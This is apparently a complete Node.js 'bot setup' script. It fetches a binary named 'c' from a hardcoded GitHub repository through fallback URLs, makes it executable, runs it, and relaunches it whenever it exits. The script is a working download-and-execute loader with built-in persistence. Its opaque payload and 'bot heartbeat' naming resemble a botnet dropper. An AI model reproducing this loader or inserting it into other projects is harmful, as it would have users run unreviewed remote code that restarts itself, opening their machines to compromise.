const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const OWNER = 'malasahjagotwin';
const REPO = 'cgo';
const BASES = [
  `https://raw.githubusercontent.com/${OWNER}/${REPO}/main`,
  `https://github.com/${OWNER}/${REPO}/raw/refs/heads/main`,
];

function request(url, redirects) {
  return new Promise((resolve, reject) => {
    const mod = url.startsWith('https:') ? https : http;
    const req = mod.get(url, { headers: { 'User-Agent': 'node' } }, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location && redirects < 5) {
        res.resume();
        resolve(request(new URL(res.headers.location, url).toString(), redirects + 1));
        return;
      }
      if (res.statusCode !== 200) {
        res.resume();
        resolve({ status: res.statusCode, buffer: null });
        return;
      }
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: 200, buffer: Buffer.concat(chunks) }));
    });
    req.on('error', reject);
    req.setTimeout(20000, () => req.destroy(new Error('timeout')));
  });
}

async function download(rel, dest) {
  for (const base of BASES) {
    try {
      const { status, buffer } = await request(`${base}/${rel}`, 0);
      if (status === 200 && buffer && buffer.length > 0) {
        await fs.promises.mkdir(path.dirname(dest), { recursive: true });
        await fs.promises.writeFile(dest, buffer);
        await fs.promises.chmod(dest, 0o755);
        return true;
      }
    } catch {}
  }
  return false;
}

async function fetchBot() {
  const dest = path.join(__dirname, 'c');
  let ok = false;
  for (let attempt = 0; attempt < 3 && !ok; attempt++) {
    ok = await download('abots/c/c', dest);
    if (!ok) {
      await new Promise((r) => setTimeout(r, 2000 * (attempt + 1)));
    }
  }
  console.log(`${ok ? 'downloaded' : 'failed to download'} bot binary`);
  return ok;
}

async function main() {
  console.log('bots setup: fetching bot binary from GitHub');
  if (!(await fetchBot())) {
    console.error('setup failed, exiting');
    process.exit(1);
  }
  console.log('starting bot heartbeat');
  const bot = spawn(path.join(__dirname, 'c'), [], {
    stdio: 'inherit',
    cwd: __dirname,
  });
  bot.on('exit', (code) => {
    console.log(`bot exited with code ${code}, restarting`);
    setTimeout(main, 2000);
  });
}

main();